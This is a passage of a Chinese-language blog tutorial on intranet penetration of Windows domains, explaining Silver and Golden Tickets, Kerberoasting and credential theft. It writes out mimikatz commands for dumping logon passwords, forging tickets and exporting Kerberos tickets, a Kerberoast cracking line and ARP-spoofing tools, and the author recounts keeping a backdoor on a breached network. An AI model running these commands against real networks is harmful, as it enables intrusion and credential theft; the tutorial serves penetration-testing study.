Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Silver Ticket：伪造TGS，只能访问指定的服务</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">加密方式不同：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Golden Ticket由krbtgt的哈希加密</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Silver Ticket由服务账号（通常为计算机账户）Hash加密</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">认证流程不同：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Golden Ticket在使用的过程需要同域控通信</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">Silver Ticket在使用的过程不需要同域控通信</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">用户在适当的端口上连接到托管服务的服务器并呈现TGS（AP-REQ）。该服务使用其NTLM密码散列打开TGS票证。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;vertical-align: inherit;">与域控制器没有AS-REQ / AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于银票是伪造的TGS，所以没有与域控制器通信。<br  /></span><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.49874686716791977" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/16_nNueiaRz6SxXpBx1DeNj0sUtSpah8w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVgSDI4GX5KJG0s4Y3RKR4XmSMInNueiaRz6SxXpBx1DeNj0sUtSpah8w/640?wx_fmt=png'" data-type="png" data-w="1197" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">银票是伪造的Kerberos的票证授予服务（TGS）票据，也称为服务票据。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">域上获取信息</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs bash" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">mimikatz <span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">log</span> <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"sekurlsa::logonpasswords"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">首先需要获得如下信息:</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/domain</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/sid</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/target:目标服务器的域名全称，此处为域控的全称</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/service:目标服务器上面的kerberos服务，此处为cifs</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/rc4:计算机账户的NTLM hash，域控主机的计算机账户</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">/user:要伪造的用户名，此处可用silver测试</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs apache" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">mimikatz</span>.exe <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.3692022263450835" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/17_M9JOjnL9TKicT4Cc9TzMakHdI1v3ZA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVrliaqN5dL7QlEUY9XWgLKiaibFb2M9JOjnL9TKicT4Cc9TzMakHdI1v3ZA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1078" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span><br  /><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">就可以访问域的cifs共享，访问其它是不行的，Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限</span></p><h3 name="h3-7" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">域服务账号破解</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">与上面SPN扫描类似的原理</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/nidem/kerberoast</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">获取所有用作SPN的帐户</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">setspn</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-T</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">PENTEST</span>.com <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-Q</span> *<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">/*</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.984" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/18_FH0wf45e3uxicFNbPzttfkzNgW8bRw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVmDmKPrcsqAcx9rwojkcFicz3dBFH0wf45e3uxicFNbPzttfkzNgW8bRw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1000" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">从Mimikatz的RAM中提取获得的门票</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs cpp" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">kerberos::<span class="hljs-built_in" style="font-size:14px;line-height:34px;;color: rgb(0, 134, 179);">list</span> /<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">export</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.2576530612244898" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/19_icVrTSKBbydZdKRQkb0Afo4icL8HSA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVW9ciaXthkOQjmZt8NUswR8jkzWBicVrTSKBbydZdKRQkb0Afo4icL8HSA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1568" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">用rgsrepcrack破解</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">tgsrepcrack</span>.py <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">wordlist</span>.txt 1<span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-MSSQLSvc</span>~<span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">sql01</span>.medin.local~1433<span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-MYDOMAIN</span>.LOCAL.kirbi</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">没复现成功</span></p><h3 name="h3-8" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">凭证盗窃</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">最常用的手法域管理登录历史记录，记得获取某边界权限一个然后抓取散列并没有域管理的，可能是搞的动静有点大，管理员第二天上去把马给清除了，还好留了有后门再次抓取哈希直接获取到域管理员。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">大多数Active Directory管理员使用用户帐户登录到其工作站，然后使用RunAs（将其管理凭据放置在本地工作站上）或RDP连接到服务器运行Mimikatz读取密码，收集密码尝试登录管理员机器一般只要域管理员登录过的机器抓取都可以获取域控了</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">防：管理员不应该拿着域用户去登录web服务器或者邮件服务器一但这些被攻破抓取的密码就是域了</span></p><h3 name="h3-9" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">地址解析协议</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">最后才是ARP欺骗不到最后不要拿出来。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">Responder</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">cain</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">ettercap</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">BDFProxy</span></p><h2 name="h2-10" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:22px;line-height:42px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">获取AD哈希</span></h2><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">攻击者如何转储Active Directory数据库</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=2398</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, 